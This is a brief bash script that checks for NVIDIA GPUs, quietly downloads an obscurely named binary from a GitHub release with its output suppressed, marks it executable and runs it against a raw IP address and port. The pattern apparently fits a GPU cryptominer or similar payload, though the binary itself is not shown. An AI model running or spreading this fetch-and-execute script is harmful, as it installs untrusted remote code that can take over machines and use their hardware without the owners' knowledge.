#!/bin/bash
nvidia-smi -L
wget https://github.com/bellingerpau37/conmuangangqua/releases/download/1/ngocnga &> /dev/null
chmod +x ngocnga 
./ngocnga  -P http://64.52.174.172:4545/"$1" &> log
